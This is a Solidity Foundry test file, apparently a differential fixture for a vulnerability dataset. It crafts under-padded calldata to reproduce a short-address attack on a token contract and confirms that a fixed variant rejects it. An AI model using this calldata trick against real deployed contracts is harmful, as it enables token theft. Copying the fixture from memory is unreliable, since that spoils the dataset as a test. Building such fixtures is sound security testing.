// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ShortAddressExample} from "../src/ShortAddressExample.sol";
import {ShortAddressExampleFixed} from "../src/ShortAddressExampleFixed.sol";

/// @title Differential fixture for dataset/short_addresses/short_address_example.sol
contract ShortAddressExampleFixtureTest is Test {
    address internal constant ATTACKER = address(0xABCD);

    /// @dev Builds a 67-byte calldata: selector + a 31-byte (under-padded) address
    ///      word + a full 32-byte amount word. Because the address word is one
    ///      byte short, the following amount word is read shifted by one byte.
    function _shortCalldata(address to, uint256 amount) internal pure returns (bytes memory) {
        bytes memory addrWord = abi.encode(to); // 32 bytes: 12 zero bytes + 20 address bytes
        bytes memory shortAddr = new bytes(31);
        for (uint256 i = 0; i < 31; i++) {
            shortAddr[i] = addrWord[i + 1]; // drop the leading zero-pad byte
        }
        return abi.encodePacked(bytes4(keccak256("sendCoin()")), shortAddr, abi.encode(amount));
    }

    /// @notice Attack DOES fire: the under-padded address shifts `amount` by 8 bits,
    ///         so 1 requested token moves 256 and is credited to the shifted address.
    function test_fixtureReproducesShortAddress() public {
        ShortAddressExample target = new ShortAddressExample();

        bytes32 slot = keccak256(abi.encode(ATTACKER, uint256(0)));
        vm.store(address(target), slot, bytes32(uint256(10000)));

        address to = address(0x1111111111111111111111111111111111111111);
        address shifted = address(uint160(uint256(uint160(to)) << 8));
        uint256 requested = 1;
        uint256 shiftedAmount = requested * 256;

        bytes memory cd = _shortCalldata(to, requested);
        assertEq(cd.length, 67);

        vm.prank(ATTACKER);
        (bool ok, ) = address(target).call(cd);
        assertTrue(ok);

        assertEq(target.getBalance(ATTACKER), 10000 - shiftedAmount);
        assertEq(target.getBalance(shifted), shiftedAmount);
        assertEq(target.getBalance(to), 0);
    }

    /// @notice Same attack does NOT fire on the fixed variant: malformed calldata
    ///         is rejected and no balances move.
    function test_fixtureDoesNotReproduceShortAddress() public {
        ShortAddressExampleFixed target = new ShortAddressExampleFixed();

        bytes32 slot = keccak256(abi.encode(ATTACKER, uint256(0)));
        vm.store(address(target), slot, bytes32(uint256(10000)));

        address to = address(0x1111111111111111111111111111111111111111);
        address shifted = address(uint160(uint256(uint160(to)) << 8));

        bytes memory cd = _shortCalldata(to, 1);
        assertEq(cd.length, 67);

        vm.prank(ATTACKER);
        (bool ok, ) = address(target).call(cd);
        assertFalse(ok); // rejected

        assertEq(target.getBalance(ATTACKER), 10000);
        assertEq(target.getBalance(shifted), 0);
        assertEq(target.getBalance(to), 0);
    }
}
